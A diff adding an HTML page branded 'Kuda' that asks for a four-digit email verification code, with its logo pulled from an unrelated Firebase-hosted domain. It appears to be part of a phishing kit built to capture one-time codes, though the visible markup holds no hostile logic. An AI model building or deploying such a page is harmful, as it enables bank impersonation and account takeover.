@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="https://younk-5b894.web.app/images/logo.png"
+      type="image/x-icon"
+    />
+    <title>Kuda</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="/css/otp.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="contentSec">
+        <div class="title">Email Verfication</div>
+        <span
+          >Please enter the Verfication code sent to your Email Address
+        </span>
+      </div>
+      <div class="formSec">
+        <div class="input">
+          <div class="img">
+            <img src="/images/email.jpg" alt="" />
+          </div>
+          <form method="post">
+            <input
+              type="password"
+              id="digit1"
+              class="pin-input"
+              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+              inputmode="numeric"
+              pattern="[0-9]*"
+            />
+            <input
+              type="password"
+              id="digit2"
+              class="pin-input"
+              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+              inputmode="numeric"
+              pattern="[0-9]*"
+            />
+            <input
+              type="password"
+              id="digit3"
+              class="pin-input"
+              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+              inputmode="numeric"
+              pattern="[0-9]*"
+            />
+            <input
+              type="password"
+              id="digit4"
+              class="pin-input"
+              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+              inputmode="numeric"
+              pattern="[0-9]*"
+            />
+          </form>
+        </div>
+
+        <div class="buttonSec">
+          <button id="submitBtn" type="submit">Continue</button>
+        </div>
+      </div>
+    </div>
+    <script src="/js/app.otp.js"></script>
+  </body>
+</html>
